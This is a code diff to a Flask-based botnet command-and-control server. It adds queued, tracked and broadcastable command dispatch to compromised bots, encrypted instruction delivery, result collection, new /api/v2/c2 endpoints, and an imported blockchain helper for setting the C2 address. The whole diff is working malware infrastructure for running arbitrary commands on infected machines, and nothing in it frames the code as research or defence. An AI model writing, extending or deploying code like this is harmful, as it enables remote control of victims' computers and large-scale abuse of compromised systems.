@@ -30,6 +30,7 @@ import csv
 import stat
 from urllib.parse import urlparse
 from flask import Flask, request, jsonify, send_from_directory
+from typing import Dict, List, Optional, Tuple
 
 CURRENT_DIR = Path(__file__).resolve().parent
 PROJECT_ROOT = CURRENT_DIR.parent
@@ -150,7 +151,148 @@ else:
 
 # --- Bot Management ---
 bots = {}
-commands = {}
+commands: Dict[str, List[Dict[str, object]]] = {}
+
+# Each entry in command_history is a dict describing the lifecycle of a command
+# for a single bot target. command_index allows quick lookups by bot+command_id.
+command_history: List[Dict[str, object]] = []
+command_index: Dict[str, Dict[str, object]] = {}
+COMMAND_HISTORY_LIMIT = 500
+
+
+def _history_key(bot_id: str, command_id: int) -> str:
+    return f"{bot_id}:{command_id}"
+
+
+def _prune_history() -> None:
+    """Keep the command history bounded by evicting completed entries."""
+    while len(command_history) > COMMAND_HISTORY_LIMIT:
+        oldest = command_history[0]
+        if oldest.get("status") != "completed":
+            break
+        command_history.pop(0)
+        key = _history_key(oldest["bot_id"], oldest["command_id"])
+        if command_index.get(key) is oldest:
+            command_index.pop(key, None)
+
+
+def _ensure_command_id(requested_id, bot_id: str) -> int:
+    """Return a unique integer command_id for the given bot."""
+    candidate: Optional[int] = None
+    if requested_id is not None:
+        try:
+            candidate = int(requested_id)
+        except (TypeError, ValueError):
+            candidate = None
+
+    attempts = 0
+    while candidate is None or _history_key(bot_id, candidate) in command_index:
+        candidate = random.randint(1000, 9999)
+        attempts += 1
+        if attempts > 10000:
+            raise RuntimeError("Unable to allocate unique command_id.")
+    return candidate
+
+
+def _build_instruction(command_type: str, data: Dict[str, object]) -> Tuple[Dict[str, object], Dict[str, object]]:
+    """Create a bot-facing instruction payload and the metadata for history tracking."""
+    payload: Dict[str, object] = {
+        "type": command_type,
+    }
+    history_payload: Dict[str, object] = {"type": command_type}
+
+    if command_type == "command":
+        command_text = data.get("command")
+        if not command_text:
+            raise ValueError("Missing command text")
+        payload["command"] = command_text
+        history_payload["command"] = command_text
+    elif command_type == "function":
+        function_name = data.get("function")
+        if not function_name:
+            raise ValueError("Missing function name")
+        payload["function"] = function_name
+        history_payload["function"] = function_name
+        params = data.get("params") or {}
+        history_payload["params"] = params
+        if params:
+            payload["params"] = params
+    else:
+        raise ValueError(f"Unsupported command type '{command_type}'")
+
+    return payload, history_payload
+
+
+def _enqueue_command(request_json: Dict[str, object]) -> Tuple[List[Dict[str, object]], Dict[str, object]]:
+    """Common logic for enqueuing commands via v1 or v2 endpoints."""
+    targets = request_json.get("targets") or []
+    if not isinstance(targets, list):
+        raise ValueError("targets must be a list")
+    targets = [str(t).strip() for t in targets if str(t).strip()]
+
+    broadcast = bool(request_json.get("broadcast"))
+    if not targets and broadcast:
+        targets = list(bots.keys())
+
+    if not targets:
+        raise ValueError("Missing targets")
+
+    command_type = (request_json.get("type") or "command").lower()
+    instruction_template, history_template = _build_instruction(command_type, request_json)
+
+    issued_by = request_json.get("issued_by")
+    metadata = request_json.get("metadata") if isinstance(request_json.get("metadata"), dict) else {}
+
+    response_meta = {
+        "command_type": command_type,
+        "targets": targets,
+        "broadcast": broadcast,
+    }
+
+    created_records: List[Dict[str, object]] = []
+
+    for bot_id in targets:
+        command_id = _ensure_command_id(request_json.get("command_id"), bot_id)
+
+        instruction = dict(instruction_template)
+        instruction["command_id"] = command_id
+
+        record_payload = dict(history_template)
+
+        history_entry = {
+            "command_id": command_id,
+            "bot_id": bot_id,
+            "type": history_template.get("type"),
+            "status": "queued",
+            "created_at": time.time(),
+            "delivered_at": None,
+            "completed_at": None,
+            "issued_by": issued_by,
+            "broadcast": broadcast,
+            "metadata": metadata,
+            "payload": record_payload,
+            "response": None,
+        }
+
+        if history_template.get("command") is not None:
+            record_payload["command"] = history_template["command"]
+        if history_template.get("function") is not None:
+            record_payload["function"] = history_template["function"]
+        if history_template.get("params") is not None:
+            record_payload["params"] = history_template["params"]
+
+        queue_entry = {"instruction": instruction, "record": history_entry}
+        if bot_id not in commands:
+            commands[bot_id] = []
+        commands[bot_id].append(queue_entry)
+
+        key = _history_key(bot_id, command_id)
+        command_index[key] = history_entry
+        command_history.append(history_entry)
+        created_records.append(history_entry)
+
+    _prune_history()
+    return created_records, response_meta
 
 # --- Encryption/Decryption ---
 def encrypt_data(data):
@@ -219,9 +361,13 @@ def ping():
 @app.route('/api/bot/poll/<bot_id>', methods=['GET'])
 def poll_commands(bot_id):
     if bot_id in commands and commands[bot_id]:
-        command = commands[bot_id].pop(0)
-        encrypted_command = encrypt_data(json.dumps(command))
-        logger.info(f"Sending command to bot {bot_id}: {command}")
+        entry = commands[bot_id].pop(0)
+        record = entry["record"]
+        record["status"] = "dispatched"
+        record["delivered_at"] = time.time()
+        instruction = entry["instruction"]
+        encrypted_command = encrypt_data(json.dumps(instruction))
+        logger.info(f"Sending command to bot {bot_id}: {instruction}")
         return encrypted_command
     else:
         response_payload = {'status': 'ok', 'output': 'no commands'}
@@ -238,6 +384,22 @@ def receive_response(bot_id):
     command_id = data.get('command_id')
     output = data.get('output')
     logger.info(f"Received response from bot {bot_id} for command {command_id}: {output}")
+
+    key = None
+    if command_id is not None:
+        try:
+            key = _history_key(str(bot_id), int(command_id))
+        except (TypeError, ValueError):
+            logger.debug("Invalid command_id from bot %s: %r", bot_id, command_id)
+            key = None
+    if key and key in command_index:
+        record = command_index[key]
+        record["status"] = "completed"
+        record["completed_at"] = time.time()
+        record["response"] = output
+    else:
+        logger.debug(f"No command history entry found for bot {bot_id} command_id {command_id}")
+
     return jsonify({'status': 'ok'})
 
 @app.route('/api/bot/log/<bot_id>', methods=['POST'])
@@ -267,23 +429,82 @@ def check_bot_statuses():
 def get_bots():
     return jsonify(bots)
 
+@app.route('/api/v2/c2/command', methods=['POST'])
+def issue_c2_command_v2():
+    data = request.get_json(silent=True) or {}
+
+    try:
+        created, meta = _enqueue_command(data)
+    except ValueError as exc:
+        return jsonify({'status': 'error', 'message': str(exc)}), 400
+    except Exception as exc:  # unexpected
+        logger.exception("Failed to enqueue v2 command.")
+        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500
+
+    logger.info(
+        "Issued %s to bots: %s",
+        meta["command_type"],
+        ", ".join(meta["targets"]),
+    )
+
+    response_body = {
+        'status': 'ok',
+        'metadata': meta,
+        'commands': [
+            {
+                'bot_id': record['bot_id'],
+                'command_id': record['command_id'],
+                'status': record['status'],
+            }
+            for record in created
+        ],
+    }
+    return jsonify(response_body)
+
+
+@app.route('/api/v2/c2/commands', methods=['GET'])
+def get_all_commands_v2():
+    module_filter = request.args.get('module')
+
+    def _matches(record: Dict[str, object]) -> bool:
+        if not module_filter:
+            return True
+        metadata = record.get('metadata') or {}
+        return metadata.get('module') == module_filter
+
+    filtered = [record for record in command_history if _matches(record)]
+    filtered.sort(key=lambda item: item.get('created_at') or 0, reverse=True)
+    return jsonify({'commands': filtered})
+
+
+@app.route('/api/c2/commands', methods=['GET'])
+def get_all_commands():
+    """Backward compatible endpoint returning the same payload as v2."""
+    return get_all_commands_v2()
+
+
 @app.route('/api/c2/command', methods=['POST'])
 def issue_c2_command():
-    data = request.json
-    targets = data.get('targets', [])
-    command = data.get('command')
+    """Legacy command endpoint: only supports simple command dispatch."""
+    data = request.get_json(silent=True) or {}
+    if 'command' not in data:
+        return jsonify({'status': 'error', 'message': 'Missing command'}), 400
+    data.setdefault('type', 'command')
 
-    if not targets or not command:
-        return jsonify({'status': 'error', 'message': 'Missing targets or command'}), 400
+    try:
+        created, meta = _enqueue_command(data)
+    except ValueError as exc:
+        return jsonify({'status': 'error', 'message': str(exc)}), 400
+    except Exception:
+        logger.exception("Failed to enqueue legacy command.")
+        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500
 
-    command_obj = {'type': 'command', 'command': command, 'command_id': random.randint(1000, 9999)}
+    logger.info(
+        "Issued legacy command '%s' to bots: %s",
+        data.get('command'),
+        ", ".join(meta['targets']),
+    )
 
-    for bot_id in targets:
-        if bot_id not in commands:
-            commands[bot_id] = []
-        commands[bot_id].append(command_obj)
-
-    logger.info(f"Issued command '{command}' to bots: {targets}")
     return jsonify({'status': 'ok'})
 
 from blockchain_utils import compile_contract, deploy_contract, get_contract_instance, set_c2_url
